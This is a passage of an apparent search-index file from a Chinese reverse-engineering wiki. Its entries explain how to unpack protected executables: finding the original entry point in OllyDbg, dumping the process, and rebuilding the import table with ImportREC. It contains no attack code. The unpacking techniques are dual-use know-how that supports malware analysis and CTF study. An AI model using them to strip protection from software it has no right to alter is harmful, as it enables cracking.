\u8fd0\u884c\u7a0b\u5e8f, \u7a0b\u5e8f\u4f1a\u5728\u89e6\u53d1\u65ad\u70b9\u65f6\u65ad\u4e0b. \u5982\u56fe\u6765\u5230\u4e86 0040D3B0 \u7684\u4f4d\u7f6e. \u8fd9\u91cc\u5c31\u662f\u4e0a\u4e00\u7bc7\u6211\u4eec\u5355\u6b65\u8ddf\u8e2a\u65f6\u5230\u8fbe\u7684\u4f4d\u7f6e, \u5269\u4f59\u7684\u5c31\u4e0d\u518d\u8d58\u8ff0.","title":"\u793a\u4f8b"},{"location":"reverse/unpack/fix-iat/","text":"\u539f\u7406 \u00b6 \u5728\u627e\u5230\u7a0b\u5e8fOEP\u540e, \u6211\u4eec\u9700\u8981\u5c06\u7a0b\u5e8fdump\u51fa\u6765, \u5e76\u91cd\u5efa IAT . IAT \u5168\u540d\u662f Import Address Table , \u8868\u9879\u6307\u5411\u51fd\u6570\u5b9e\u9645\u5730\u5740. \u793a\u4f8b \u00b6 \u6bd4\u5982\u5982\u4e0b, \u6211\u4eec\u627e\u5230\u4e86OEP, \u5230\u8fbe\u4e86\u7a0b\u5e8f\u7684\u771f\u6b63\u5165\u53e3\u70b9. \u6211\u4eec\u8fd9\u65f6\u5c31\u9700\u8981\u5c06\u7a0b\u5e8fdump\u51fa\u6765. \u6211\u4eec\u53f3\u952e, \u9009\u62e9 \"\u7528OllyDump\u8131\u58f3\u8c03\u8bd5\u8fdb\u7a0b\" (\u4e0d\u8fc7\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528 LoadPE \u6765dump\u51fa\u6765): \u5f39\u51fa\u4e00\u4e2a\u7a97\u53e3, \u770b\u4e00\u4e0b\u5730\u5740\u662f\u5426\u6b63\u786e, \u4e3b\u8981\u5c31\u662f\u770b\u770b \u5165\u53e3\u70b9\u5730\u5740 \u6709\u6ca1\u6709\u9009\u5bf9. \u7136\u540e\u53d6\u6d88\u52fe\u9009 \u91cd\u5efa\u8f93\u5165\u8868 . \u5c06dump\u51fa\u7684\u6587\u4ef6\u547d\u540d, \u6211\u8fd9\u91cc\u662f\u547d\u540d\u4e3a dump.exe \u5566. \u6211\u4eec\u5c1d\u8bd5\u6765\u8fd0\u884c\u4e00\u4e0b dump.exe , \u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u65e0\u6cd5\u6b63\u5e38\u8fd0\u884c, \u5bf9\u4e8e\u4e00\u4e9b\u7b80\u5355\u7684\u58f3, \u4f60dump\u51fa\u6765\u53d1\u73b0\u65e0\u6cd5\u6b63\u5e38\u8fd0\u884c, \u5982\u679c\u4f60\u786e\u5b9e\u627e\u5230\u4e86\u6b63\u786e\u7684OEP\u5e76\u7528 IDA \u53cd\u7f16\u8bd1\u67e5\u770b\u7ed3\u679c\u826f\u597d, \u90a3\u4e48\u4f60\u7684\u7b2c\u4e00\u60f3\u6cd5\u5c31\u5e94\u8be5\u662f\u7a0b\u5e8f\u7684 IAT \u51fa\u73b0\u4e86\u95ee\u9898. \u4f60\u5c31\u9700\u8981\u91cd\u5efa IAT . \u6211\u4eec\u9700\u8981\u4f7f\u7528 ImportREC \u6765\u5e2e\u52a9\u4fee\u590d\u8f93\u5165\u8868. \u6253\u5f00 ImportREC , \u9009\u62e9\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b \u539f\u7248.exe ( \u539f\u7248.exe \u662f\u6211\u5728OD\u4e2d\u6b63\u5728\u8c03\u8bd5\u7684\u8fdb\u7a0b, OD\u4e2d\u7684 EIP \u6b63\u5904\u5728 OEP \u4f4d\u7f6e, \u5728\u7528 Ollydump \u4e4b\u540e\u4e0d\u8981\u5173\u95ed\u8fd9\u4e2a\u8fdb\u7a0b\u54e6.). ImportREC \u4fee\u590d\u8f93\u5165\u8868\u5165\u53e3\u70b9\u9700\u8981\u77e5\u9053 OEP , \u4e5f\u5c31\u662f\u8981\u5728\u7a97\u53e3\u53f3\u4fa7\u4e2d\u95f4\u7684 OEP \u8f93\u5165\u6846\u4e2d\u8fdb\u884c\u8f93\u5165 \u6211\u4eec\u6240\u77e5, \u5728Ollydbg\u91cc\u6211\u4eec\u77e5\u9053\u7a0b\u5e8f\u76ee\u524d\u5728\u7684\u5165\u53e3\u70b9\u662f 0049C25C , \u800c\u955c\u50cf\u57fa\u5740\u662f 00400000 \u56e0\u6b64\u6211\u4eec\u8fd9\u91cc\u9700\u8981\u586b\u5199 OEP \u662f 0009C25C \u6211\u4eec\u4fee\u6539 ImportREC \u4e2d\u7684 OEP \u4e3a 0009C25C \u7136\u540e\u70b9\u51fb AutoSearch \u540e, \u5f39\u51fa\u63d0\u793a\u6846\"\u53d1\u73b0\u53ef\u80fd\u662f\u539fIAT\u5730\u5740\" \u6211\u4eec\u70b9\u51fb \"Get Imports\" \u6309\u94ae\u4fbf\u53ef\u4ee5\u91cd\u5efa IAT . \u5de6\u4fa7\u4f1a\u663e\u793a IAT \u4e2d\u5404\u5bfc\u5165\u51fd\u6570\u7684\u5730\u5740\u4ee5\u53ca\u662f\u5426\u6709\u6548. \u663e\u7136\u5728\u56fe\u4e2d\u53ef\u4ee5\u770b\u5230 ImportREC \u627e\u5230\u4e86\u5185\u5b58\u4e2d IAT \u7684\u4f4d\u7f6e\u5e76\u68c0\u6d4b\u51fa\u5404\u4e2a\u51fd\u6570\u90fd\u662f\u6709\u6548\u7684. \u6211\u4eec\u70b9\u51fb Fix Dump , \u7136\u540e\u6253\u5f00\u5148\u524d\u4f7f\u7528 OllyDump \u63d2\u4ef6\u8f6c\u50a8\u51fa\u6765\u7684\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f dump.exe \u6587\u4ef6\u3002 \u90a3\u4e48 ImportREC \u5c31\u4f1a\u5e2e\u52a9\u6062\u590d\u5bfc\u5165\u8868\uff0c\u5e76\u751f\u6210 dump_.exe \u6587\u4ef6. dump_.exe \u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c","title":"DUMP \u53ca IAT \u91cd\u5efa"},{"location":"reverse/unpack/fix-iat/#_1","text":"\u5728\u627e\u5230\u7a0b\u5e8fOEP\u540e, \u6211\u4eec\u9700\u8981\u5c06\u7a0b\u5e8fdump\u51fa\u6765, \u5e76\u91cd\u5efa IAT . IAT \u5168\u540d\u662f Import Address Table , \u8868\u9879\u6307\u5411\u51fd\u6570\u5b9e\u9645\u5730\u5740.","title":"\u539f\u7406"},{"location":"reverse/unpack/fix-iat/#_2","text":"\u6bd4\u5982\u5982\u4e0b, \u6211\u4eec\u627e\u5230\u4e86OEP, \u5230\u8fbe\u4e86\u7a0b\u5e8f\u7684\u771f\u6b63\u5165\u53e3\u70b9. \u6211\u4eec\u8fd9\u65f6\u5c31\u9700\u8981\u5c06\u7a0b\u5e8fdump\u51fa\u6765. \u6211\u4eec\u53f3\u952e, \u9009\u62e9 \"\u7528OllyDump\u8131\u58f3\u8c03\u8bd5\u8fdb\u7a0b\" (\u4e0d\u8fc7\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528 LoadPE \u6765dump\u51fa\u6765): \u5f39\u51fa\u4e00\u4e2a\u7a97\u53e3, \u770b\u4e00\u4e0b\u5730\u5740\u662f\u5426\u6b63\u786e, \u4e3b\u8981\u5c31\u662f\u770b\u770b \u5165\u53e3\u70b9\u5730\u5740 \u6709\u6ca1\u6709\u9009\u5bf9. \u7136\u540e\u53d6\u6d88\u52fe\u9009 \u91cd\u5efa\u8f93\u5165\u8868 . \u5c06dump\u51fa\u7684\u6587\u4ef6\u547d\u540d, \u6211\u8fd9\u91cc\u662f\u547d\u540d\u4e3a dump.exe \u5566. \u6211\u4eec\u5c1d\u8bd5\u6765\u8fd0\u884c\u4e00\u4e0b dump.exe , \u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u65e0\u6cd5\u6b63\u5e38\u8fd0\u884c, \u5bf9\u4e8e\u4e00\u4e9b\u7b80\u5355\u7684\u58f3, \u4f60dump\u51fa\u6765\u53d1\u73b0\u65e0\u6cd5\u6b63\u5e38\u8fd0\u884c, \u5982\u679c\u4f60\u786e\u5b9e\u627e\u5230\u4e86\u6b63\u786e\u7684OEP\u5e76\u7528 IDA \u53cd\u7f16\u8bd1\u67e5\u770b\u7ed3\u679c\u826f\u597d, \u90a3\u4e48\u4f60\u7684\u7b2c\u4e00\u60f3\u6cd5\u5c31\u5e94\u8be5\u662f\u7a0b\u5e8f\u7684 IAT \u51fa\u73b0\u4e86\u95ee\u9898. \u4f60\u5c31\u9700\u8981\u91cd\u5efa IAT . \u6211\u4eec\u9700\u8981\u4f7f\u7528 ImportREC \u6765\u5e2e\u52a9\u4fee\u590d\u8f93\u5165\u8868. \u6253\u5f00 ImportREC , \u9009\u62e9\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b \u539f\u7248.exe ( \u539f\u7248.exe \u662f\u6211\u5728OD\u4e2d\u6b63\u5728\u8c03\u8bd5\u7684\u8fdb\u7a0b, OD\u4e2d\u7684 EIP \u6b63\u5904\u5728 OEP \u4f4d\u7f6e, \u5728\u7528 Ollydump \u4e4b\u540e\u4e0d\u8981\u5173\u95ed\u8fd9\u4e2a\u8fdb\u7a0b\u54e6.). ImportREC \u4fee\u590d\u8f93\u5165\u8868\u5165\u53e3\u70b9\u9700\u8981\u77e5\u9053 OEP , \u4e5f\u5c31\u662f\u8981\u5728\u7a97\u53e3\u53f3\u4fa7\u4e2d\u95f4\u7684 OEP \u8f93\u5165\u6846\u4e2d\u8fdb\u884c\u8f93\u5165 \u6211\u4eec\u6240\u77e5, \u5728Ollydbg\u91cc\u6211\u4eec\u77e5\u9053\u7a0b\u5e8f\u76ee\u524d\u5728\u7684\u5165\u53e3\u70b9\u662f 0049C25C , \u800c\u955c\u50cf\u57fa\u5740\u662f 00400000 \u56e0\u6b64\u6211\u4eec\u8fd9\u91cc\u9700\u8981\u586b\u5199 OEP \u662f 0009C25C \u6211\u4eec\u4fee\u6539 ImportREC \u4e2d\u7684 OEP \u4e3a 0009C25C \u7136\u540e\u70b9\u51fb AutoSearch \u540e, \u5f39\u51fa\u63d0\u793a\u6846\"\u53d1\u73b0\u53ef\u80fd\u662f\u539fIAT\u5730\u5740\" \u6211\u4eec\u70b9\u51fb \"Get Imports\" \u6309\u94ae\u4fbf\u53ef\u4ee5\u91cd\u5efa IAT . \u5de6\u4fa7\u4f1a\u663e\u793a IAT \u4e2d\u5404\u5bfc\u5165\u51fd\u6570\u7684\u5730\u5740\u4ee5\u53ca\u662f\u5426\u6709\u6548. \u663e\u7136\u5728\u56fe\u4e2d\u53ef\u4ee5\u770b\u5230 ImportREC \u627e\u5230\u4e86\u5185\u5b58\u4e2d IAT \u7684\u4f4d\u7f6e\u5e76\u68c0\u6d4b\u51fa\u5404\u4e2a\u51fd\u6570\u90fd\u662f\u6709\u6548\u7684. \u6211\u4eec\u70b9\u51fb Fix Dump , \u7136\u540e\u6253\u5f00\u5148\u524d\u4f7f\u7528 OllyDump \u63d2\u4ef6\u8f6c\u50a8\u51fa\u6765\u7684\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f dump.exe \u6587\u4ef6\u3002 \u90a3\u4e48 ImportREC \u5c31\u4f1a\u5e2e\u52a9\u6062\u590d\u5bfc\u5165\u8868\uff0c\u5e76\u751f\u6210 dump_.exe \u6587\u4ef6. dump_.exe \u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c","title":"\u793a\u4f8b"},{"location":"reverse/unpack/last-exception/","text":"\u6700\u540e\u4e00\u6b21\u5f02\u5e38\u6cd5\u7684\u539f\u7406\u662f, \u7a0b\u5e8f\u5728\u81ea\u89e3\u538b\u6216\u81ea\u89e3\u5bc6\u8fc7\u7a0b\u4e2d, \u53ef\u80fd\u4f1a\u89e6\u53d1\u65e0\u6570\u6b21\u7684\u5f02\u5e38. \u5982\u679c\u80fd\u5b9a\u4f4d\u5230\u6700\u540e\u4e00\u6b21\u7a0b\u5e8f\u5f02\u5e38\u7684\u4f4d\u7f6e, \u53ef\u80fd\u5c31\u4f1a\u5f88\u63a5\u8fd1\u81ea\u52a8\u8131\u58f3\u5b8c\u6210\u4f4d\u7f6e. \u73b0\u5728\u6700\u540e\u4e00\u6b21\u5f02\u5e38\u6cd5\u8131\u58f3\u53ef\u4ee5\u5229\u7528Ollydbg\u7684\u5f02\u5e38\u8ba1\u6570\u5668\u63d2\u4ef6, \u5148\u8bb0\u5f55\u5f02\u5e38\u6570\u76ee, \u7136\u540e\u91cd\u65b0\u8f7d\u5165, \u81ea\u52a8\u505c\u5728\u6700\u540e\u4e00\u6b21\u5f02\u5e38\u5904. \u8981\u70b9 \u00b6 \u70b9\u51fb \u9009\u9879->\u8c03\u8bd5\u9009\u9879\u2014>\u5f02\u5e38 , \u628a\u91cc\u9762\u7684\u221a\u5168\u90e8\u53bb\u6389! \u6309\u4e0b CTRL+F2 \u91cd\u8f7d\u4e0b\u7a0b\u5e8f \u5f00\u59cb\u7a0b\u5e8f\u5c31\u662f\u4e00\u4e2a\u8df3\u8f6c, \u5728\u8fd9\u91cc\u6211\u4eec\u6309 SHIFT+F9 , \u76f4\u5230\u7a0b\u5e8f\u8fd0\u884c, \u8bb0\u4e0b\u4ece\u5f00\u59cb\u6309 SHIFT+F9 \u5230\u7a0b\u5e8f\u8fd0\u884c\u7684\u6b21\u6570 m ! CTRL+F2 \u91cd\u8f7d\u7a0b\u5e8f, \u6309 SHIFT+F9 (\u8fd9\u6b21\u6309\u7684\u6b21\u6570\u4e3a\u7a0b\u5e8f\u8fd0\u884c\u7684\u6b21\u6570 m-1 \u6b21) \u5728OD\u7684\u53f3\u4e0b\u89d2\u6211\u4eec\u770b\u89c1\u6709\u4e00\u4e2a\" SE \u53e5\u67c4 \", \u8fd9\u65f6\u6211\u4eec\u6309 CTRL+G , \u8f93\u5165 SE \u53e5\u67c4 \u524d\u7684\u5730\u5740! \u6309F2\u4e0b\u65ad\u70b9!\u7136\u540e\u6309 SHIFT+F9 \u6765\u5230\u65ad\u70b9\u5904, F8\u5355\u6b65\u8ddf\u8e2a \u793a\u4f8b \u00b6 \u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: 5_last_exception.zip OD\u8f7d\u5165\u7a0b\u5e8f, \u5728\u83dc\u5355 \u9009\u9879->\u8c03\u8bd5\u8bbe\u7f6e->\u5f02\u5e38\u6807\u7b7e\u9875 \u4e2d\u53d6\u6d88\u52fe\u9009\u6240\u6709\u7684\u5ffd\u7565\u5f02\u5e38, \u7136\u540e\u91cd\u8f7d\u7a0b\u5e8f. \u6211\u4eec\u6309\u4e0b Shift+F9 , \u8bb0\u5f55\u6309\u4e86\u591a\u5c11\u6b21, \u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c. \u6211\u4eec\u8981\u5f97\u5230\u7684\u662f\u5012\u6570\u7b2c\u4e8c\u6b21\u6309\u4e0b\u662f\u6309\u4e86\u591a\u5c11\u6b21. \u5728\u672c\u4f8b\u4e2d shift+F9 \u4e00\u6b21, \u5230\u4e86 0040CCD2 \u7684\u4f4d\u7f6e shift+F9 \u4e24\u6b21, \u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c \u90a3\u4e48\u6211\u4eec\u91cd\u8f7d\u7a0b\u5e8f, \u53ea\u9700\u6309\u4e0b1\u6b21( 2-1=1 ) Shift+F9 , \u6765\u5230 0040CCD2 \u7684\u4f4d\u7f6e, \u89c2\u5bdf\u5806\u6808\u7a97\u53e3, \u8fd9\u91cc\u6709\u4e00\u4e2a SE\u5904\u7406\u7a0b\u5e8f: 0040CCD7 \u6211\u4eec\u5728CPU\u7a97\u53e3(\u6c47\u7f16\u6307\u4ee4), \u6309 Ctrl+G , \u8f93\u5165 0040CCD7 , \u7136\u540e\u5728\u6b64\u5904\u6309\u4e0bF2. \u4e5f\u5c31\u662f\u5728 0040CCD7 \u5904\u8bbe\u7f6e\u65ad\u70b9, \u7136\u540e\u6309\u4e0b Shift+F9 \u8fd0\u884c, \u89e6\u53d1\u65ad\u70b9. \u89e6\u53d1\u65ad\u70b9\u540e, \u6765\u5355\u6b65\u8ddf\u8e2a. \u5411\u4e0b\u90fd\u662f\u4e00\u4e9b\u5faa\u73af\u548c\u8df3\u8f6c, \u6211\u4eec\u4f7f\u7528F4\u8df3\u8fc7\u5faa\u73af. \u6700\u540e\u5230\u8fbe\u5982\u4e0b\u4f4d\u7f6e \u663e\u7136\u5728\u6700\u540e\u7684 mov ebp, 0041010CC; jmp ebp \u662f\u5728\u8df3\u8f6c\u5411OEP, \u6211\u4eec\u8df3\u8f6c\u8fc7\u53bb\u5982\u4e0b\u56fe\u6240\u793a: \u663e\u7136, \u6211\u4eec\u5e78\u8fd0\u5730\u6765\u5230\u4e86OEP\u5904.","title":"\u6700\u540e\u4e00\u6b21\u5f02\u5e38\u6cd5"},{"location":"reverse/unpack/last-exception/#_1","text":"\u70b9\u51fb \u9009\u9879->\u8c03\u8bd5\u9009\u9879\u2014>\u5f02\u5e38 , \u628a\u91cc\u9762\u7684\u221a\u5168\u90e8\u53bb\u6389! \u6309\u4e0b CTRL+F2 \u91cd\u8f7d\u4e0b\u7a0b\u5e8f \u5f00\u59cb\u7a0b\u5e8f\u5c31\u662f\u4e00\u4e2a\u8df3\u8f6c, \u5728\u8fd9\u91cc\u6211\u4eec\u6309 SHIFT+F9 , \u76f4\u5230\u7a0b\u5e8f\u8fd0\u884c, \u8bb0\u4e0b\u4ece\u5f00\u59cb\u6309 SHIFT+F9 \u5230\u7a0b\u5e8f\u8fd0\u884c\u7684\u6b21\u6570 m ! CTRL+F2 \u91cd\u8f7d\u7a0b\u5e8f, \u6309 SHIFT+F9 (\u8fd9\u6b21\u6309\u7684\u6b21\u6570\u4e3a\u7a0b\u5e8f\u8fd0\u884c\u7684\u6b21\u6570 m-1 \u6b21) \u5728OD\u7684\u53f3\u4e0b\u89d2\u6211\u4eec\u770b\u89c1\u6709\u4e00\u4e2a\" SE \u53e5\u67c4 \", \u8fd9\u65f6\u6211\u4eec\u6309 CTRL+G , \u8f93\u5165 SE \u53e5\u67c4 \u524d\u7684\u5730\u5740! \u6309F2\u4e0b\u65ad\u70b9!\u7136\u540e\u6309 SHIFT+F9 \u6765\u5230\u65ad\u70b9\u5904, F8\u5355\u6b65\u8ddf\u8e2a","title":"\u8981\u70b9"},{"location":"reverse/unpack/last-exception/#_2","text":"\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: 5_last_exception.zip OD\u8f7d\u5165\u7a0b\u5e8f, \u5728\u83dc\u5355 \u9009\u9879->\u8c03\u8bd5\u8bbe\u7f6e->\u5f02\u5e38\u6807\u7b7e\u9875 \u4e2d\u53d6\u6d88\u52fe\u9009\u6240\u6709\u7684\u5ffd\u7565\u5f02\u5e38, \u7136\u540e\u91cd\u8f7d\u7a0b\u5e8f. \u6211\u4eec\u6309\u4e0b Shift+F9 , \u8bb0\u5f55\u6309\u4e86\u591a\u5c11\u6b21, \u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c. \u6211\u4eec\u8981\u5f97\u5230\u7684\u662f\u5012\u6570\u7b2c\u4e8c\u6b21\u6309\u4e0b\u662f\u6309\u4e86\u591a\u5c11\u6b21. \u5728\u672c\u4f8b\u4e2d shift+F9 \u4e00\u6b21, \u5230\u4e86 0040CCD2 \u7684\u4f4d\u7f6e shift+F9 \u4e24\u6b21, \u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c \u90a3\u4e48\u6211\u4eec\u91cd\u8f7d\u7a0b\u5e8f, \u53ea\u9700\u6309\u4e0b1\u6b21( 2-1=1 ) Shift+F9 , \u6765\u5230 0040CCD2 \u7684\u4f4d\u7f6e, \u89c2\u5bdf\u5806\u6808\u7a97\u53e3, \u8fd9\u91cc\u6709\u4e00\u4e2a SE\u5904\u7406\u7a0b\u5e8f: 0040CCD7 \u6211\u4eec\u5728CPU\u7a97\u53e3(\u6c47\u7f16\u6307\u4ee4), \u6309 Ctrl+G , \u8f93\u5165 0040CCD7 , \u7136\u540e\u5728\u6b64\u5904\u6309\u4e0bF2. \u4e5f\u5c31\u662f\u5728 0040CCD7 \u5904\u8bbe\u7f6e\u65ad\u70b9, \u7136\u540e\u6309\u4e0b Shift+F9 \u8fd0\u884c, \u89e6\u53d1\u65ad\u70b9. \u89e6\u53d1\u65ad\u70b9\u540e, \u6765\u5355\u6b65\u8ddf\u8e2a. \u5411\u4e0b\u90fd\u662f\u4e00\u4e9b\u5faa\u73af\u548c\u8df3\u8f6c, \u6211\u4eec\u4f7f\u7528F4\u8df3\u8fc7\u5faa\u73af. \u6700\u540e\u5230\u8fbe\u5982\u4e0b\u4f4d\u7f6e \u663e\u7136\u5728\u6700\u540e\u7684 mov ebp, 0041010CC; jmp ebp \u662f\u5728\u8df3\u8f6c\u5411OEP, \u6211\u4eec\u8df3\u8f6c\u8fc7\u53bb\u5982\u4e0b\u56fe\u6240\u793a: \u663e\u7136, \u6211\u4eec\u5e78\u8fd0\u5730\u6765\u5230\u4e86OEP\u5904.","title":"\u793a\u4f8b"},{"location":"reverse/unpack/manually-fix-iat/","text":"\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u4ece\u6b64\u94fe\u63a5\u4e0b\u8f7d: manually_fix_iat.zip \u6211\u4eec\u5e38\u7528\u7684 ImportREC \u8131\u58f3\u662f\u4f7f\u7528\u7684\u8f6f\u4ef6\u81ea\u5e26\u7684 IAT auto search , \u4f46\u662f\u5982\u679c\u6211\u4eec\u8981\u624b\u52a8\u67e5\u627e IAT \u7684\u5730\u5740\u5e76 dump \u51fa\u6765, \u53c8\u8be5\u600e\u4e48\u64cd\u4f5c\u5462\uff1f \u9996\u5148\u4f7f\u7528ESP\u5b9a\u5f8b, \u53ef\u4ee5\u5f88\u5feb\u5730\u8df3\u8f6c\u5230 OEP: 00401110 . \u6211\u4eec\u53f3\u952e\u70b9\u51fb, \u9009\u62e9 \u67e5\u627e->\u6240\u6709\u6a21\u5757\u95f4\u7684\u8c03\u7528 \u663e\u793a\u51fa\u8c03\u7528\u7684\u51fd\u6570\u5217\u8868, \u6211\u4eec\u53cc\u51fb\u5176\u4e2d\u7684\u67d0\u4e2a\u51fd\u6570(\u6ce8\u610f\u8fd9\u91cc\u8981\u53cc\u51fb\u7684\u5e94\u8be5\u662f\u7a0b\u5e8f\u7684\u51fd\u6570\u800c\u4e0d\u662f\u7cfb\u7edf\u51fd\u6570) \u6211\u4eec\u6765\u5230\u4e86\u51fd\u6570\u8c03\u7528\u5904 \u53f3\u952e\u70b9\u51fb \u8ddf\u968f , \u8fdb\u5165\u51fd\u6570 \u7136\u540e\u518d\u53f3\u952e\u70b9\u51fb \u6570\u636e\u7a97\u53e3\u4e2d\u8ddf\u968f->\u5185\u5b58\u5730\u5740 \u8fd9\u91cc\u56e0\u4e3a\u663e\u793a\u662f\u5341\u516d\u8fdb\u5236\u503c, \u4e0d\u65b9\u4fbf\u67e5\u770b, \u6211\u4eec\u53ef\u4ee5\u5728\u6570\u636e\u7a97\u53e3\u70b9\u51fb\u53f3\u952e\u9009\u62e9 \u957f\u578b->\u5730\u5740 , \u5c31\u53ef\u4ee5\u663e\u793a\u51fd\u6570\u540d \u6ce8\u610f\u6211\u4eec\u8981\u5411\u4e0a\u7ffb\u5230IAT\u8868\u7684\u8d77\u59cb\u4f4d\u7f6e, \u53ef\u4ee5\u770b\u5230\u6700\u5f00\u59cb\u7684\u51fd\u6570\u5730\u5740\u662f 004050D8 \u7684 kernel.AddAtomA , \u6211\u4eec\u5411\u4e0b\u627e\u5230\u6700\u540e\u4e00\u4e2a\u51fd\u6570, \u4e5f\u5c31\u662f user32.MessageBoxA \u51fd\u6570, \u8ba1\u7b97\u4e00\u4e0b\u6574\u4e2aIAT\u8868\u7684\u5927\u5c0f\u3002\u5728OD\u7684\u6700\u4e0b\u65b9\u6709\u663e\u793a \u5757\u5927\u5c0f\uff1a0x7C , \u6240\u4ee5\u6211\u4eec\u6574\u4e2aIAT\u5757\u5927\u5c0f\u5c31\u662f 0x7C \u6253\u5f00 ImportREC , \u9009\u62e9\u6211\u4eec\u6b63\u5728\u8c03\u8bd5\u7684\u8fd9\u4e2a\u7a0b\u5e8f, \u7136\u540e\u5206\u522b\u8f93\u5165 OEP\uff1a1110, RVA:50D8, SIZE:7C , \u7136\u540e\u70b9\u51fb \u83b7\u53d6\u8f93\u5165\u8868 \u8fd9\u91cc\u5728\u8f93\u5165\u8868\u7a97\u53e3\u4e2d\u53f3\u952e\u9009\u62e9 \u9ad8\u7ea7\u547d\u4ee4->\u9009\u62e9\u4ee3\u7801\u5757 . \u7136\u540e\u4f1a\u5f39\u51fa\u7a97\u53e3, \u9009\u62e9\u5b8c\u6574\u8f6c\u50a8, \u4fdd\u5b58\u4e3a dump.exe \u6587\u4ef6 dump\u5b8c\u6210\u540e, \u9009\u62e9 \u8f6c\u50a8\u5230\u6587\u4ef6 , \u8fd9\u91cc\u9009\u62e9\u4fee\u590d\u6211\u4eec\u521a\u521adump\u51fa\u7684dump.exe, \u5f97\u5230\u4e00\u4e2a dump\\_.exe . \u8fd9\u65f6\u6574\u4e2a\u8131\u58f3\u5c31\u5b8c\u6210\u4e86","title":"\u624b\u52a8\u67e5\u627e IAT \u5e76\u4f7f\u7528 ImportREC \u91cd\u5efa"},{"location":"reverse/unpack/memory/","text":"\u5185\u5b58\u955c\u50cf\u6cd5\u662f\u5728\u52a0\u58f3\u7a0b\u5e8f\u88ab\u52a0\u8f7d\u65f6, \u901a\u8fc7OD\u7684 ALT+M \u5feb\u6377\u952e, \u8fdb\u5165\u5230\u7a0b\u5e8f\u865a\u62df\u5185\u5b58\u533a\u6bb5. \u7136\u540e\u901a\u8fc7\u52a0\u4e24\u6b21\u5185\u5b58\u4e00\u6b21\u6027\u65ad\u70b9, \u5230\u8fbe\u7a0b\u5e8f\u6b63\u786eOEP\u7684\u4f4d\u7f6e. \u5185\u5b58\u955c\u50cf\u6cd5\u7684\u539f\u7406\u5728\u4e8e\u5bf9\u4e8e\u7a0b\u5e8f\u8d44\u6e90\u6bb5\u548c\u4ee3\u7801\u6bb5\u4e0b\u65ad\u70b9, \u4e00\u822c\u7a0b\u5e8f\u81ea\u89e3\u538b\u6216\u8005\u81ea\u89e3\u5bc6\u65f6, \u4f1a\u9996\u5148\u8bbf\u95ee\u8d44\u6e90\u6bb5\u83b7\u53d6\u6240\u9700\u8d44\u6e90, \u7136\u540e\u5728\u81ea\u52a8\u8131\u58f3\u5b8c\u6210\u540e, \u8f6c\u56de\u7a0b\u5e8f\u4ee3\u7801\u6bb5. \u8fd9\u65f6\u5019\u4e0b\u5185\u5b58\u4e00\u6b21\u6027\u65ad\u70b9, \u7a0b\u5e8f\u5c31\u4f1a\u505c\u5728OEP\u5904. \u8981\u70b9 \u00b6 \u9009\u62e9\u83dc\u5355\u7684 \u9009\u9879->\u8c03\u8bd5\u9009\u9879->\u5f02\u5e38 \u52fe\u9009\u6240\u6709\u7684\u5ffd\u7565\u5f02\u5e38 \u6309\u4e0b ALT+M , \u6253\u5f00\u5185\u5b58\u955c\u50cf, \u627e\u5230\u7a0b\u5e8f\u7684\u7b2c\u4e00\u4e2a .rsrc , \u6309F2\u4e0b\u65ad\u70b9, \u7136\u540e\u6309 SHIFT+F9 \u8fd0\u884c\u5230\u65ad\u70b9 \u518d\u6309 ALT+M , \u6253\u5f00\u5185\u5b58\u955c\u50cf, \u627e\u5230\u7a0b\u5e8f\u7684\u7b2c\u4e00\u4e2a .rsrc \u4e0a\u9762\u7684 .text (\u5728\u793a\u4f8b\u4e2d\u662f 00401000 \u5904), \u6309F2\u4e0b\u65ad\u70b9. \u7136\u540e\u6309 SHIFT+F9 \uff08\u6216\u8005\u662f\u5728\u6ca1\u5f02\u5e38\u60c5\u51b5\u4e0b\u6309F9\uff09 \u793a\u4f8b \u00b6 \u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: 4_memory.zip OD\u8f7d\u5165\u7a0b\u5e8f, \u5728\u83dc\u5355\u680f\u7684 \u9009\u9879->\u8c03\u8bd5\u8bbe\u7f6e->\u5f02\u5e38\u6807\u7b7e\u9875 \u4e2d\u52fe\u9009\u6240\u6709\u7684\u5ffd\u7565\u5f02\u5e38 \u6309\u4e0b Alt+M \u6253\u5f00\u5185\u5b58\u955c\u50cf, \u627e\u5230\u8d44\u6e90\u6bb5, \u4e5f\u5c31\u662f \u5730\u5740=00407000 , \u5927\u5c0f=00005000 \u7684 .rsrc \u6bb5, \u9009\u4e2dF2\u4e0b\u65ad \u56de\u5230CPU\u7a97\u53e3, \u6309\u4e0bF9\u8fd0\u884c, \u7a0b\u5e8f\u65ad\u5728\u4e86 0040D75F \u5904 \u518d\u6b21\u6309\u4e0b Alt+M \u6253\u5f00\u5185\u5b58\u955c\u50cf, \u5bf9 .text \u4ee3\u7801\u6bb5\u4e0b\u65ad \u518d\u7ee7\u7eed\u8fd0\u884c, \u7a0b\u5e8f\u65ad\u5728\u4e86 004010CC \u5904, \u4e5f\u5c31\u662fOEP","title":"\u5185\u5b58\u955c\u50cf\u6cd5"},{"location":"reverse/unpack/memory/#_1","text":"\u9009\u62e9\u83dc\u5355\u7684 \u9009\u9879->\u8c03\u8bd5\u9009\u9879->\u5f02\u5e38 \u52fe\u9009\u6240\u6709\u7684\u5ffd\u7565\u5f02\u5e38 \u6309\u4e0b ALT+M , \u6253\u5f00\u5185\u5b58\u955c\u50cf, 